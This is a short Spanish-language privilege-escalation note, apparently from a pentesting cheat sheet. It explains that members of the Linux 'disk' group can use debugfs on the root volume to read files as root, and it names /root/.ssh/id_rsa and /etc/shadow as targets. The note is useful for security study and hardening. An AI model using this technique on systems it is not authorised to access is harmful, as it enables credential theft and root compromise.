---
tags: [privesc, linux, disk]
---

# Disk Group

Los usuarios del grupo **disk** tienen acceso completo a los dispositivos en `/dev`. Con `debugfs` se puede acceder a todo el sistema de archivos como root.

```bash
# Ver discos montados
df -h

# Acceder al disco raíz con debugfs
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```

Desde `debugfs` se puede leer `/root/.ssh/id_rsa`, `/etc/shadow`, etc.

